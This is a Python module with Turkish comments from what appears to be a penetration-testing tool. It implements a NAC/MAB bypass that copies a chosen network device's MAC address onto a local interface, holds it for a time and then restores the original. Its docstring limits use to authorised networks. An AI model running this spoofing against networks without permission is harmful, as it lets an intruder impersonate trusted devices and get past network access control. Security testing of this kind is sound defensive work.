import asyncio
import logging
import re
from dataclasses import dataclass
from app.core.process_runner import ProcessRunner
from app.scanners.nac_scanner import ActiveDevice

logger = logging.getLogger(__name__)


@dataclass
class BypassResult:
    interface: str
    original_mac: str
    spoofed_mac: str
    target_device: ActiveDevice
    success: bool
    note: str = ""


class NacBypassService:
    """
    Seçilen bir cihazın MAC adresini interface'e uygular.
    Bu; NAC/MAB kontrollerini test etmek için kullanılır.
    Yalnızca kendi yönetiminizdeki/izin verilen ağlarda çalıştırın.
    """

    async def get_current_mac(self, interface: str) -> str:
        result = await ProcessRunner.run(["ip", "link", "show", interface], timeout=5)
        m = re.search(r"link/ether\s+([0-9a-f:]{17})", result.stdout)
        return m.group(1) if m else "unknown"

    async def spoof_mac(self, interface: str, new_mac: str) -> bool:
        """
        1. Interface'i down al
        2. MAC adresini değiştir (ip link veya macchanger)
        3. Interface'i up al
        """
        steps = [
            ["ip", "link", "set", interface, "down"],
            ["ip", "link", "set", interface, "address", new_mac],
            ["ip", "link", "set", interface, "up"],
        ]
        for cmd in steps:
            result = await ProcessRunner.run(cmd, timeout=10)
            if result.returncode != 0:
                # ip link başarısız olursa macchanger ile dene
                if "address" in cmd:
                    alt = await ProcessRunner.run(
                        ["macchanger", "-m", new_mac, interface], timeout=10
                    )
                    if alt.returncode != 0:
                        logger.error("MAC değiştirme başarısız: %s", alt.stderr)
                        return False
        return True

    async def restore_mac(self, interface: str, original_mac: str) -> bool:
        return await self.spoof_mac(interface, original_mac)

    async def run_bypass(
        self,
        interface: str,
        target: ActiveDevice,
        hold_seconds: int = 30,   # MAC'i bu kadar süre tut, sonra geri al
    ) -> BypassResult:
        original_mac = await self.get_current_mac(interface)
        logger.info("Orijinal MAC: %s → Hedef MAC: %s (%s)", original_mac, target.mac, target.ip)

        success = await self.spoof_mac(interface, target.mac)
        if not success:
            return BypassResult(
                interface=interface, original_mac=original_mac,
                spoofed_mac=target.mac, target_device=target,
                success=False, note="MAC değiştirme başarısız (root yetkisi gerekebilir)",
            )

        logger.info("MAC değiştirildi → %s. %d saniye bekleniyor...", target.mac, hold_seconds)
        await asyncio.sleep(hold_seconds)

        # Her zaman geri al — hata olsa bile finally bloğuna taşıyabiliriz
        await self.restore_mac(interface, original_mac)
        logger.info("MAC geri alındı → %s", original_mac)

        return BypassResult(
            interface=interface, original_mac=original_mac,
            spoofed_mac=target.mac, target_device=target,
            success=True,
            note=f"{hold_seconds}s boyunca {target.ip} ({target.vendor}) olarak taklit edildi",
        )